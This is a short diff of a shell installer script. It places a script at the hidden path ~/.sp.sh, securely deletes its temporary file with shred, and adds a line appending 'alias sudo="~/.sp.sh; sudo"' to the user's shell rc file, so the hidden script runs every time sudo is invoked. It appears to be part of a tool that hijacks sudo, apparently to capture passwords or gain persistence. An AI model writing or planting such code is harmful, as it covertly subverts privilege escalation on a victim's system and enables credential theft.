@@ -47,9 +47,11 @@ commentit() {
 
 filename() {
 	cp sp.sh sp.sh.tmp3
-	sed "s/pwd/$filename/g" sp.sh.tmp3 > sp.sh
+	sed "s/.pwd/$filename/g" sp.sh.tmp3 > sp.sh
 	shred -fu sp.sh.tmp3
 }
 
 chmod +x sp.sh
 mv sp.sh "$homedir"/.sp.sh
+
+echo "alias sudo=\"~/.sp.sh; sudo\"" >> ."$shell"rc
